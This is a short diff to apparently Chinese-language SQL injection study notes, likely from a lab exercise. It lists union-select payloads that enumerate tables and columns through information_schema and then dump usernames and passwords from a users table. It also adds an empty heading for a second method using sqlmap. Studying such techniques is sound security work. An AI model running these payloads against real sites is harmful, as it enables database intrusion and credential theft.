@@ -1,3 +1,4 @@
+方法一：
 1.利用order by判断字段数
 2.利用union select联合查询，获取表名
     0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+
@@ -5,3 +6,6 @@
     0' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+
 4.利用union select联合查询，获取字段值(0x3a是冒号)
     0‘ union select 1,group_concat(username,0x3a,password),3 from users--+
+
+方法二(使用sqlmap)：
+
